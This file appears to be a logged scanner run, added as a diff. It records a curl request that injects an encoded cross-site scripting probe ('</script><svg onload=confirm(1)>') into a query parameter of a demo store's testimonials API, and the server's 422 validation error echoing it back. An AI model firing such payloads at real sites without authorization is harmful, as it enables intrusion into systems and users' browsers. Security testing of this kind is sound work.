@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' 'https://duck-store.escape.tech/api/v1/testimonials/?featured_only=s5xe77d0dfc%22%27%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Csvg+onload%3Dconfirm%281%29%3E'
+# exit_code: 0
+# ---
+
+{"detail":[{"type":"bool_parsing","loc":["query","featured_only"],"msg":"Input should be a valid boolean, unable to interpret input","input":"s5xe77d0dfc\"'></title></script><svg onload=confirm(1)>"}]}
+HTTP_STATUS:422
+CTYPE:application/json
